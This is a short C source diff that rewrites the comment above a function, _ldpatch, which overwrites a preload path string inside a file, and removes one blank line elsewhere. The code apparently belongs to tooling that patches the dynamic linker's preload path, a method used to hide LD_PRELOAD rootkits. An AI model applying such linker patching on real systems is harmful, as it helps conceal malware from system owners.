@@ -1,5 +1,7 @@
 /* overwrites, in the contents of path, whatever oldpreload contains with whatever newpreload contains.
- * if the return value is 0 then bindup failed for some reason. presumably because path doesn't exist.
+ * if the return value is 0 then either:
+ *    bindup failed. presumably because path doesn't exist.
+ *    or oldpreload could not be located in path's contents.
  * if the return value is <0 something went horribly wrong. otherwise everything went ok. */
 int _ldpatch(const char *path, const char *oldpreload, const char *newpreload){
     if(strlen(oldpreload) != strlen(newpreload))
@@ -96,6 +98,5 @@ int ldpatch(const char *oldpreload, const char *newpreload){
     }
 
     free(foundld);
-
     return c;
 }
